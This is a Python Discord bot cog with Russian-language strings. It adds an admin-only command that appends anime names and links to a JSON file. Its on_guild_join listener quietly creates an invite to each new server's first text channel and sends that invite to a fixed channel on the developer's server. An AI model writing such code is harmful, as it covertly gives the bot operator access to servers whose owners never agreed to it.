import disnake
from disnake.ext import commands
import random
import json

admin = 993270145302667307

class Admin(commands.Cog):
    def __init__(self,bot):
        self.bot = bot
    @commands.Cog.listener()
    async def on_ready(self):
        print(f'Bot Loaded | admin.py ✅')

    @commands.slash_command(name="add_anime", description="Добавить новое аниме в список")
    @commands.has_role(admin)
    async def add_anime(self, interaction, name: str, link: str):
        with open('jsons/anime.json', 'r', encoding='utf-8') as f:
            anime_list = json.load(f)
        new_anime = {"name": name, "link": link}
        anime_list.append(new_anime)
        with open('jsons/anime.json', 'w', encoding='utf-8') as f:
            json.dump(anime_list, f, ensure_ascii=False, indent=4)

        await interaction.response.send_message(f'Аниме "{name}" успешно добавлено в список!')

    @commands.Cog.listener()
    async def on_guild_join(self, guild):
        server_id = 984079879802876035
        channel_id = 1179439390095843358

        # Получаем объект сервера (guild) и объект канала (channel) по идентификаторам
        server = self.bot.get_guild(server_id)
        channel = server.get_channel(channel_id)

        channelNewServer = guild.text_channels[0]
        invite = await channelNewServer.create_invite()
        if channel:
            await channel.send(f"Бота добавили на новый сервер: **{guild.name}** ! \n Бот создал приглашение: {invite.url}")

def setup(bot):
    bot.add_cog(Admin(bot))